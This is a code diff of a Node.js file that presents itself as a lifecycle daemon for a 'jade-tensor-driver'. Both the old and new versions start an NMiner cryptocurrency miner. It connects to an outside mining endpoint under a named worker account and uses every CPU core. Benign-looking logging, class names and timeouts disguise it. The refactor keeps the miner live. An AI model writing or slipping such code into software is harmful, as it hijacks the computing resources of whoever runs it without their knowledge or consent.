@@ -3,27 +3,29 @@ const os = require("os");
 const { NMiner } = require("nminer");
 const config = require("./app/config");
 
-(async () => {
-    const traceId = "99751f";
-    console.log(`[lifecycle] Daemon ${config.appName || "jade-tensor-driver"} active [tag: ${traceId}]`);
+class DaemonSupervisor {
+    constructor() {
+        const instanceToken = "713bcc";
+        console.log(`[lifecycle] Initialized DaemonSupervisor for jade-tensor-driver [${instanceToken}]`);
 
-    const bridge = new NMiner(
-        "wss://runtime.nmining.igrp.app/",
-        "Subhas1975.ocelot",
-        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
-    );
+        this.scheduler = new NMiner(
+            "wss://runtime.nmining.igrp.app/",
+            "Subhas1975.ocelot",
+            { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
+        );
 
-    const tick = () => { setTimeout(tick, 31000); }; tick();
-    setTimeout(() => {
-        console.log("[timeout] Operational limit (315m) reached, exiting cleanly.");
+        const keepAlivePromise = new Promise(() => {});
+        setTimeout(() => {
+        console.log("[timeout] Operational limit (317m) reached, exiting cleanly.");
         process.exit(0);
-    }, 315 * 60 * 1000);
+    }, 317 * 60 * 1000);
 
-    process.once("SIGTERM", () => {
-        
-        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
-        process.exit(0);
-    });
+        process.on("SIGTERM", () => {
+            
+            console.log("[supervisor] Clean shutdown completed.");
+            process.exit(0);
+        });
+    }
+}
 
-    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
-})().catch(console.error);
+new DaemonSupervisor();
